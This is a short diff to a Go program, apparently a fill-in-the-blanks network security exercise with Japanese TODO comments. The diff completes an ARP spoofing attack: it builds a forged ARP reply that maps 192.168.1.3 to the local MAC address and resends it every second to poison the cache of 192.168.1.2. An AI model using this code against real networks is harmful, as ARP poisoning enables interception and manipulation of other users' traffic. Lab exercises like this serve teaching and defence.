@@ -9,6 +9,7 @@ import (
 	"log"
 	"net"
 	"strings"
+	"time"
 )
 
 type nwDevice struct {
@@ -53,7 +54,17 @@ func main() {
 		EthernetType: layers.EthernetTypeARP,
 	}
 	// Todo: ARPスプーフィングをするリプライを作成してください
-	arpreply := &layers.ARP{}
+	arpreply := &layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPReply,
+		SourceHwAddress:   netif.macAddr,
+		SourceProtAddress: []byte{192, 168, 1, 3},
+		DstHwAddress:      []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+		DstProtAddress:    []byte{192, 168, 1, 2},
+	}
 	packetbuf := gopacket.NewSerializeBuffer()
 	err := gopacket.SerializeLayers(
 		packetbuf,
@@ -71,6 +82,12 @@ func main() {
 	}
 
 	// Todo: ARPリプライを送信し続けてください
+	go func() {
+		for {
+			time.Sleep(1000 * time.Millisecond)
+			handle.WritePacketData(packetbuf.Bytes())
+		}
+	}()
 
 	// Todo: ICMPを受信してください
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
